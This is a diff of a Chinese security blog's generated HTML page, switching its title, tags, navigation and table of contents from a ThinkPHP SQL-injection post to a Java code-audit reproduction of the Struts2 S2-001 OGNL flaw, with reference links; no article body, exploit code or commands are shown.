+<p>##0x05  参考<br><a href="http://d1iv3.me/2018/02/01/S2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">S2-001漏洞分析</a><br><a href="https://wystatic.tuisec.win/static/drops/papers-340.html" target="_blank" rel="noopener">OGNL设计及使用不当造成的远程代码执行漏洞</a><br><a href="https://www.sqyysec.com/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Struts-001远程代码执行漏洞分析</a></p>
 
       
     </div>
@@ -472,12 +501,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/thinkphp-5-0-10-sql注入漏洞-支持子查询/">thinkphp 5.0.10 sql注入漏洞 支持子查询</a></p>
+  <p><span>本文标题:</span><a href="/java代码审计入门之s2-001复现分析/">java代码审计入门之s2-001复现分析</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
-  <p><span>发布时间:</span>2019年01月25日 - 23:58</p>
-  <p><span>最后更新:</span>2019年03月07日 - 11:38</p>
-  <p><span>原始链接:</span><a href="/thinkphp-5-0-10-sql注入漏洞-支持子查询/" title="thinkphp 5.0.10 sql注入漏洞 支持子查询">https://zhengbao.wang/thinkphp-5-0-10-sql注入漏洞-支持子查询/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/thinkphp-5-0-10-sql注入漏洞-支持子查询/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年04月13日 - 17:56</p>
+  <p><span>最后更新:</span>2019年04月13日 - 17:57</p>
+  <p><span>原始链接:</span><a href="/java代码审计入门之s2-001复现分析/" title="java代码审计入门之s2-001复现分析">https://zhengbao.wang/java代码审计入门之s2-001复现分析/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/java代码审计入门之s2-001复现分析/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -538,7 +567,9 @@
           
             <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
           
-            <a href="/tags/thinkphp/" rel="tag"><i class="fa fa-tag"></i> thinkphp</a>
+            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
+          
+            <a href="/tags/struct2/" rel="tag"><i class="fa fa-tag"></i> struct2</a>
           
         </div>
       
@@ -551,8 +582,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/thinkphp5-0-x-sql注入分析/" rel="next" title="thinkphp5.0.x sql注入分析">
-                <i class="fa fa-chevron-left"></i> thinkphp5.0.x sql注入分析
+              <a href="/Hadoop之Hbase架构环境搭建及使用JAVA API远程连接/" rel="next" title="Hadoop之Hbase架构环境搭建及使用JAVA API远程连接">
+                <i class="fa fa-chevron-left"></i> Hadoop之Hbase架构环境搭建及使用JAVA API远程连接
               </a>
             
           </div>
@@ -560,10 +591,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/thinkphp-缓存函数设计缺陷-getshell/" rel="prev" title="thinkphp 缓存函数设计缺陷 getshell">
-                thinkphp 缓存函数设计缺陷 getshell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -758,7 +785,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言-amp-amp-影响版本"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言&amp;&amp;影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-漏洞成因"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-测试demo"><span class="nav-number">3.</span> <span class="nav-text">0x02 测试demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-修补方法"><span class="nav-number">4.</span> <span class="nav-text">0x03 修补方法</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-环境搭建"><span class="nav-number">2.</span> <span class="nav-text">0x01 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-代码分析"><span class="nav-number">3.</span> <span class="nav-text">0x02 代码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-补丁分析"><span class="nav-number">5.</span> <span class="nav-text">0x04 补丁分析</span></a></li></ol></div>
             
 
           </div>
